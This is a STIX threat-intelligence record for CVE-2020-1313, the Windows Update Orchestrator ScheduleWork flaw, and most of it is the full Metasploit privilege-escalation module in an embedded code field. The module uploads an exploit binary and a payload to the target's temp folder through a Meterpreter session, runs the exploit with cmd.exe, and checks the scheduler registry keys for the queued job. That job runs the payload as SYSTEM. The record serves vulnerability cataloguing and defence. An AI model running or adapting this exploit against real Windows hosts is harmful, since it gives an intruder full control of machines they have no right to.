{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--496d888f-896c-4c0f-9a14-48d849037914",
    "created": "2024-08-14T16:49:34.914634Z",
    "modified": "2024-08-14T16:49:34.914638Z",
    "name": "Windows Update Orchestrator unchecked ScheduleWork call",
    "description": " This exploit uses access to the UniversalOrchestrator ScheduleWork API call which does not verify the caller's token before scheduling a job to be run as SYSTEM.  You cannot schedule something in a given time, so the payload will execute as system sometime in the next 24 hours.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/cve_2020_1313_system_orchestrator.rb",
            "external_id": "cve_2020_1313_system_orchestrator.rb"
        },
        {
            "source_name": "ImreRad",
            "external_id": "#Originaldiscovery?andPoC(https://github.com/irsl/CVE-2020-1313)"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-1313"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/irsl/CVE-2020-1313"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::Common\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Exploit::EXE\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Update Orchestrator unchecked ScheduleWork call',\n        'Description' => %q{\n          This exploit uses access to the UniversalOrchestrator ScheduleWork API call\n          which does not verify the caller's token before scheduling a job to be run\n          as SYSTEM.  You cannot schedule something in a given time, so the payload will\n          execute as system sometime in the next 24 hours.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Imre Rad', # Original discovery? and PoC (https://github.com/irsl/CVE-2020-1313)\n          'bwatters-r7' # msf module\n        ],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Targets' => [\n          ['Windows x64', { 'Arch' => ARCH_X64 }]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2019-11-04',\n        'References' => [\n          ['CVE', '2020-1313'],\n          ['URL', 'https://github.com/irsl/CVE-2020-1313']\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [\n            IOC_IN_LOGS,\n            ARTIFACTS_ON_DISK\n          ]\n        },\n        'DefaultOptions' => {\n          'DisablePayloadHandler' => true\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('EXPLOIT_NAME',\n                    [false, 'The filename to use for the exploit binary (%RAND% by default).', nil]),\n      OptString.new('PAYLOAD_NAME',\n                    [false, 'The filename for the payload to be used on the target host (%RAND%.exe by default).', nil]),\n      OptString.new('WRITABLE_DIR',\n                    [false, 'Path to write binaries (%TEMP% by default).', nil]),\n      OptInt.new('EXPLOIT_TIMEOUT',\n                 [true, 'The number of seconds to wait for exploit to finish running', 60]),\n      OptInt.new('EXECUTE_DELAY',\n                 [true, 'The number of seconds to delay between file upload and exploit launch', 3])\n    ])\n  end\n\n  def exploit\n    exploit_name = datastore['EXPLOIT_NAME'] || Rex::Text.rand_text_alpha(6..14)\n    payload_name = datastore['PAYLOAD_NAME'] || Rex::Text.rand_text_alpha(6..14)\n    exploit_name = \"#{exploit_name}.exe\" unless exploit_name.end_with?('.exe')\n    payload_name = \"#{payload_name}.exe\" unless payload_name.end_with?('.exe')\n    temp_path = datastore['WRITABLE_DIR'] || session.sys.config.getenv('TEMP')\n    payload_path = \"#{temp_path}\\\\#{payload_name}\"\n    exploit_path = \"#{temp_path}\\\\#{exploit_name}\"\n    payload_exe = generate_payload_exe\n\n    # Check target\n    vprint_status('Checking Target')\n    validate_active_host\n    validate_target\n    fail_with(Failure::BadConfig, \"#{temp_path} does not exist on the target\") unless directory?(temp_path)\n\n    # Upload Exploit\n    vprint_status(\"Uploading exploit to #{sysinfo['Computer']} as #{exploit_path}\")\n    ensure_clean_destination(exploit_path)\n    exploit_bin = exploit_data('cve-2020-1313', 'cve-2020-1313-exe.x64.exe')\n    write_file(exploit_path, exploit_bin)\n    print_status(\"Exploit uploaded on #{sysinfo['Computer']} to #{exploit_path}\")\n\n    # Upload Payload\n    vprint_status(\"Uploading Payload to #{sysinfo['Computer']} as #{exploit_path}\")\n    ensure_clean_destination(payload_path)\n    write_file(payload_path, payload_exe)\n    print_status(\"Payload (#{payload_exe.length} bytes) uploaded on #{sysinfo['Computer']} to #{payload_path}\")\n    print_warning(\"This exploit requires manual cleanup of the payload #{payload_path}\")\n\n    # Run Exploit\n    vprint_status('Running Exploit')\n    begin\n      output = cmd_exec('cmd.exe', \"/c #{exploit_path} #{payload_path}\", 60)\n      vprint_status(\"Exploit Output:\\n#{output}\")\n    rescue Rex::TimeoutError => e\n      elog('Caught timeout.  Exploit may be taking longer or it may have failed.', error: e)\n      print_error('Caught timeout.  Exploit may be taking longer or it may have failed.')\n    end\n    vprint_status(\"Cleaning up #{exploit_path}\")\n    ensure_clean_destination(exploit_path)\n\n    # Check registry value\n    unless registry_key_exist?('HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Orchestrator\\UScheduler')\n      fail_with(Module::Failure::Unknown, 'Failed to find registry scheduler data!')\n    end\n    reg_keys = registry_enumkeys('HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Orchestrator\\UScheduler')\n    fail_with(Module::Failure::Unknown, 'Failed to find registry scheduler data!') if reg_keys.nil?\n    found_job = false\n    reg_keys.each do |key|\n      start_arg = registry_getvalinfo(\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\WindowsUpdate\\\\Orchestrator\\\\UScheduler\\\\#{key}\", 'startArg')\n      next unless start_arg['Data'].include? payload_name\n\n      found_job = true\n      queued_time = registry_getvalinfo(\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\WindowsUpdate\\\\Orchestrator\\\\UScheduler\\\\#{key}\", 'queuedTime')\n      q_time_i = queued_time['Data'].unpack1('L_')\n      q_time_t = (q_time_i / 10000000) - 11644473600\n      print_good(\"Payload Scheduled for execution at #{Time.at(q_time_t)}\")\n    end\n    fail_with(Module::Failure::Unknown, 'Failed to find registry scheduler data!') unless found_job\n  end\n\n  def validate_active_host\n    print_status(\"Attempting to PrivEsc on #{sysinfo['Computer']} via session ID: #{datastore['SESSION']}\")\n  rescue Rex::Post::Meterpreter::RequestError => e\n    elog('Could not connect to session', error: e)\n    raise Msf::Exploit::Failed, 'Could not connect to session'\n  end\n\n  def validate_target\n    if sysinfo['Architecture'] != ARCH_X64\n      fail_with(Failure::NoTarget, 'Exploit code is 64-bit only')\n    end\n  end\n\n  def check\n    version = get_version_info\n    vprint_status(\"OS version: #{version}\")\n    if version.build_number.between?(Msf::WindowsVersion::Win10_1903, Msf::WindowsVersion::Win10_2004)\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def ensure_clean_destination(path)\n    return unless file?(path)\n\n    print_status(\"#{path} already exists on the target. Deleting...\")\n    begin\n      file_rm(path)\n      print_status(\"Deleted #{path}\")\n    rescue Rex::Post::Meterpreter::RequestError => e\n      elog(e)\n      print_error(\"Unable to delete #{path}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-11-04",
    "x_mitre_platforms": [
        "['win']"
    ]
}